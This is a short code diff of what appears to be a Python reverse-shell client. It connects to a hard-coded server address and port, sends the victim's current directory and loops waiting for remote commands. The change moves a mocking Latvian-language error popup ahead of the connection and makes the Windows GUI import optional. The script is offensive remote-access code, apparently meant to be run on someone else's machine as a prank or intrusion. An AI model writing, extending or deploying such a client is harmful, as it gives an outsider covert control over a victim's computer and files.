@@ -2,8 +2,13 @@ import socket
 import os
 import subprocess
 import sys
-from win32gui import *
-from win32con import *
+try:
+    from win32gui import *
+    from win32con import *
+    MessageBox(None, "Tu esi Ēzelis hahahahaha\n"\
+        "Es asmu linus ;)", "Kļūda", MB_OK | MB_ICONERROR)
+except:
+    pass
 SERVER_HOST = "192.168.204.1"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
@@ -17,8 +22,7 @@ s.connect((SERVER_HOST, SERVER_PORT))
 # get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
-MessageBox(None, "Tu esi Ēzelis hahahahaha\n"\
-    "Es asmu linus ;)", "Kļūda", MB_OK | MB_ICONERROR)
+
 while True:
     output = ""
     # receive the command from the server
